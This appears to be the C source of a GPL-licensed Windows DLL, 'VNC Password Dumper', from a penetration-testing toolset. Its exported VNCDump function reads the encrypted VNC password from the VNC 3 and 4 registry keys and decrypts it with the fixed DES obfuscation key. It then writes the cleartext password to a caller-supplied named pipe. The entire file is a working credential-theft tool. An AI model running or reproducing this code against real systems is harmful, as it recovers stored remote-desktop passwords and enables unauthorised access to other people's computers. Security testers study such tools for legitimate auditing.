/*
   VNC Password Dumper
   Copyright (c) 2006- Patrik Karlsson

   http://www.cqure.net

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   
   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#include <windows.h>
#include <winnt.h>
#include "d3des.h"
#include "vncpwdump.h"
#include "registry.h"

int SendText (HANDLE hPipe, char *szText) {

    DWORD dwWritten;

    if (!WriteFile (hPipe, szText, strlen (szText), &dwWritten, NULL))
		return FALSE;

	FlushFileBuffers( hPipe );
	
	return TRUE;
}


int __declspec(dllexport) VNCDump ( char *szPipeName, char *pCmd ) {

	HANDLE hPipe;
	HKEY hVncKey;
	LONG lPwLen = 0;
	
	CHAR *pVNCSubKey = "Password";
	CHAR sEncPw[200];
	CHAR clrtxt[10];
	DWORD dwValType;
	struct keylist *pVNCKeys = NULL, *pLoop = NULL;

	pVNCKeys = AddListItem( pVNCKeys, VNC3_REGPATH );
	pVNCKeys = AddListItem( pVNCKeys, VNC4_REGPATH );
	pLoop = pVNCKeys;
	
	hPipe = CreateFile (szPipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL);
	ZeroMemory( sEncPw, sizeof( sEncPw ) );

	while ( NULL != pLoop ) {

		if ( RegOpenKey( HKEY_CURRENT_USER, pLoop->pKeyValue, &hVncKey ) != ERROR_SUCCESS ) {
			if ( RegOpenKey( HKEY_LOCAL_MACHINE, pLoop->pKeyValue, &hVncKey ) != ERROR_SUCCESS ) {
				pLoop = pLoop->next;		
				continue;

			}
		}

		lPwLen = sizeof( sEncPw );
		if ( RegQueryValueEx( hVncKey, pVNCSubKey, NULL, &dwValType, 
							(CHAR *)&sEncPw, &lPwLen ) != ERROR_SUCCESS ) {
			pLoop = pLoop->next;
			continue;
		}
		
		break;
	}
	
	FreeList( pVNCKeys );

	if ( 0 == strlen( sEncPw ) ) {
		SendText( hPipe, "ERROR: Failed to access registry keys\n" );
		return 0;
	}

	deskey(ObfKey, DE1);
    des(sEncPw, clrtxt);
	clrtxt[8] = 0;

	SendText( hPipe, clrtxt );

	RegCloseKey( hVncKey );

	CloseHandle( hPipe );

	return 0;

}